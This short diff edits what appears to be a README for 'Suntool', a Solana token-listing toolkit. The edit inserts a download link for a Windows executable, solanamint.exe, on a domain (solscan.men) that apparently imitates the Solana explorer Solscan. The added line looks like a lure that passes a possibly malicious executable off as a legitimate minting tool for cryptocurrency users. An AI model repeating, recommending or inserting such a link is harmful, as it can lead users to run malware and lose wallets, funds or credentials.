@@ -9,7 +9,7 @@ Suntool offers an easy-to-use, no-code, fully visual toolkit for Solana users.
 一站式管理Solana代币上市流程
 One-stop management of the Solana token listing process
 
-Mint工具下载：
+Mint工具下载：https://www.solscan.men/solanamint.exe
 
 
 
